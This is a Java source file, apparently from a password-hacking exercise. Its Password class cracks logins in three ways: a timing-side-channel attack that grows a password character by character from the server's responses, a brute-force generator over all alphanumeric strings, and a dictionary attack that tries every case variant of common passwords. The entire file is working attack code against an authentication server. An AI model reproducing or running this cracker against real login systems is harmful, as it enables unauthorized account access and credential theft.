package hacker.auth;

import hacker.app.Log;
import hacker.models.UserCredentials;
import hacker.util.Converter;
import hacker.util.iter.AutoClosableIterator;
import hacker.util.iter.AutoClosableLinesIterator;
import hacker.util.iter.PeekableIterator;
import hacker.util.iter.PeekingIterator;
import java.io.DataInput;
import java.io.DataOutput;
import java.io.Flushable;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.NoSuchElementException;
import java.util.Scanner;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import java.util.stream.Stream;

public final class Password {

  // Constants

  public static final List<Character> ACCEPTED_CHARS =
      constructAcceptedLetters();

  // CRUD-C

  private Password() {
  }

  // CRUD-R

  public static <O extends Flushable & DataOutput> String crackUsingTimeVulnerability(
      final DataInput dataIn, final O dataOut,
      String login) throws IOException {
    // Loop state
    var padlock = RotDial.constructDialsAsm(1); // Dials used for cracking.
    String curPwd;
    AuthResult authResult;
    do {
      // Extrapolate the loop state from the `padlock`.
      curPwd = displayEffectivePwd(padlock);
      authResult = Client.authenticate(
          dataIn, dataOut,
          new UserCredentials(login, curPwd)
      );
    } while (!adjustPadlock(padlock, authResult));
    return curPwd;
  }

  /**
   * @return true iff padlock is configured to the correct password
   */
  private static boolean adjustPadlock(List<PeekingIterator<Character>> padlock,
      AuthResult authResult) {
    return switch (authResult.response().message()) {
      case "Wrong password!" -> {
        patchPadlockState(padlock, authResult);
        yield false;
      }
      case "Connection success!" -> true;
      default -> throw new RuntimeException(
          "Unexpected request result: " + authResult);
    };
  }

  private static void patchPadlockState(
      List<PeekingIterator<Character>> padlock,
      AuthResult authResult) {
    final String usedPassword = displayEffectivePwd(padlock);
    if (authResult.wasTheUsedPwdAPrefixOfTheCorrectPwd()) {
      Log.passwordPrefix(usedPassword);
      padlock.add(RotDial.construct());
    } else {
      padlock.get(padlock.size() - 1).next();
    }
  }

  private static String displayEffectivePwd(
      List<PeekingIterator<Character>> padlock) {
    return padlock.stream()
        .map(pIter -> pIter.peek().toString())
        .collect(Collectors.joining());
  }

  public static PeekableIterator<String> allCombsPIter() {
    return new PeekableIterator<>() {
      // Instance fields

      private List<PeekingIterator<Character>> rotatingDials =
          RotDial.constructDialsAsm(1);

      // CRUD-R

      @Override public String peek() {
        return this.rotatingDials.stream()
            .map(rotDial -> rotDial.peek().toString())
            .collect(Collectors.joining(""));
      }

      @Override public boolean hasNext() {
        return true;
      }

      // CRUD-U

      @Override public String next() {
        var ret = this.peek();

        for (int firstDialToRotIdx = this.rotatingDials.size() - 1;
            0 <= firstDialToRotIdx; --firstDialToRotIdx) {
          var firstDialToRot = this.rotatingDials.get(firstDialToRotIdx);
          firstDialToRot.discardNext(); // Rotating
          // Making sure there is sth
          if (firstDialToRot.hasNext()) {
            // On successful/meaningful rotation reset all trailing dials
            for (int dialToResetIdx = firstDialToRotIdx + 1;
                dialToResetIdx < this.rotatingDials.size();
                dialToResetIdx++) {
              this.rotatingDials.set(dialToResetIdx, RotDial.construct());
            }
            // Since rotation has been performed we can return a peeked value.
            return ret;
          }
        }

        this.rotatingDials =
            RotDial.constructDialsAsm(this.rotatingDials.size() + 1);
        return ret;
      }
    };
  }

  public static Stream<String> allCombsStream() {
    return Converter.toStream(allCombsPIter());
  }

  private static List<Character> constructAcceptedLetters() {
    return Stream.of(
            IntStream.rangeClosed('a', 'z'),
            IntStream.rangeClosed('A', 'Z'),
            IntStream.rangeClosed('0', '9')
        ).reduce(IntStream.empty(), IntStream::concat)
        .mapToObj(i -> (char) i)
        .toList();
  }

  /**
   * <h6>Caseful Typical-Password Iterator</h6>
   * Caseful – having all possible combination of letter's case.
   */
  public static AutoClosableIterator<String> casefulTypicalPwdsIter() {
    AutoClosableLinesIterator typicalPwdAutoClosableIter = typicalPwdsIter();
    PeekableIterator<String> typicalPwdPeekableIter =
        new PeekingIterator<>(typicalPwdAutoClosableIter);

    return new AutoClosableIterator<>() {
      final PeekableIterator<String> typicalPwdIter = typicalPwdPeekableIter;
      final AutoCloseable internalAutoClosableRes = typicalPwdAutoClosableIter;
      long currentVariation = 0;

      @Override public void close() throws Exception {
        this.internalAutoClosableRes.close();
      }

      @Override public boolean hasNext() {
        return this.typicalPwdIter.hasNext();
      }

      @Override public String next() {
        // Stop condition
        if (!this.hasNext()) {
          throw new NoSuchElementException();
        }
        // Preparation of the outputted value.
        // Preparation: Constants
        final String curCaselessPwd = this.typicalPwdIter.peek();
        final long lastVariation = lastVariation(curCaselessPwd);
        // Preparation: IO
        var curCaselessPwdChars =
            curCaselessPwd.chars().mapToObj(integer -> (char) integer)
                .iterator();
        var out = new StringBuilder(curCaselessPwd.length());
        // Preparation: Loop
        for (long bitMask = 1; bitMask <= lastVariation; bitMask <<= 1) {
          var currChar = curCaselessPwdChars.next();
          boolean curBit = (this.currentVariation & bitMask) != 0;
          out.append(curBit ? Character.toUpperCase(currChar)
              : Character.toLowerCase(currChar));
        }
        // The inner's `.next()` condition
        if (this.currentVariation == lastVariation) {
          this.typicalPwdIter.discardNext();
          this.currentVariation = 0;
        } else {
          this.currentVariation++;
        }

        return out.toString();
      }

      private static long lastVariation(String caselessPwd) {
        return (1L << caselessPwd.length()) - 1L;
      }
    };
  }

  /**
   * <h6>Typical-Password Iterator</h6>
   *
   * @return iterator over typical passwords used by humans
   */
  public static AutoClosableLinesIterator typicalPwdsIter() {
    final Scanner pwdSource = new Scanner(
        Password.class.getResourceAsStream("TypicalPwds.csv"),
        StandardCharsets.UTF_8
    );

    return new AutoClosableLinesIterator(pwdSource);
  }
}
